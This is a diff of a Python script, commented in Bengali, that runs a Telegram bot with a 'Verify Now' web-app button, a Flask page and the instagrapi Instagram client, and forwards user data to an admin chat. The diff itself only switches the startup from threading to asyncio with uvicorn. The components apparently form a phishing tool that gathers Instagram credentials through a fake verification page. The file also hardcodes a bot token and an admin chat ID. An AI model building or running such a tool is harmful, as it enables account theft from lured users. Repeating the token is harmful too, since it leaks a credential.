@@ -1,7 +1,8 @@
 import os
 import json
-import threading
+import asyncio
 import requests
+import uvicorn
 from flask import Flask, request, render_template_string
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
@@ -11,10 +12,12 @@ from instagrapi import Client
 # ১. এখানে আপনার তথ্যগুলো বসান
 BOT_TOKEN = '9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs'
 ADMIN_CHAT_ID = '5428249457' 
-WEB_APP_URL = 'https://hlo-world.onrender.com' # আপনার Render এর লিংক
+WEB_APP_URL = 'https://hlo-world.onrender.com' # আপনার রেন্ডার লিংক
 # ==========================================
 
-# --- টেলিগ্রাম বট সেটআপ ---
+# ==========================================
+# ২. টেলিগ্রাম বট সেটআপ
+# ==========================================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("Verify Now", web_app=WebAppInfo(url=WEB_APP_URL))]
@@ -25,13 +28,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
-def run_bot():
-    print("Starting Telegram Bot...")
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.run_polling()
-
-# --- ওয়েবসাইট সেটআপ (Flask) ---
+# ==========================================
+# ৩. ওয়েবসাইট সেটআপ (Flask)
+# ==========================================
 web_app = Flask(__name__)
 
 HTML_PAGE = """
@@ -121,14 +120,30 @@ def send_error_to_telegram(user, error_msg):
     requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})
 
 # ==========================================
-# ৩. একসাথে বট এবং ওয়েবসাইট চালানো (গুরুত্বপূর্ণ)
+# ৪. বট এবং ওয়েবসাইট একসাথে চালানো
 # ==========================================
-# বট থ্রেডটি মেইন ব্লকের বাইরে রাখা হলো, যাতে Render এটি মিস না করে
-bot_thread = threading.Thread(target=run_bot, daemon=True)
-bot_thread.start()
+async def main():
+    print("Starting Bot...")
+    bot_app = ApplicationBuilder().token(BOT_TOKEN).build()
+    bot_app.add_handler(CommandHandler("start", start))
+    
+    # বট ইনিশিয়ালাইজ এবং স্টার্ট
+    await bot_app.initialize()
+    await bot_app.start()
+    await bot_app.updater.start_polling()
+    print("Bot is running and polling...")
+
+    # Flask সার্ভার (uvicorn দিয়ে) চালু করা
+    port = int(os.environ.get('PORT', 5000))
+    config = uvicorn.Config(web_app, host="0.0.0.0", port=port, log_level="info")
+    server = uvicorn.Server(config)
+    
+    print(f"Starting Web Server on port {port}...")
+    await server.serve()
 
 if __name__ == '__main__':
-    # Render এর পোর্ট নেওয়া
-    port = int(os.environ.get('PORT', 5000))
-    print(f"Starting Web Server on port {port}...")
-    web_app.run(host='0.0.0.0', port=port)
+    # asyncio লুপে বট এবং ওয়েবসাইট একসাথে রান করা হচ্ছে
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        pass
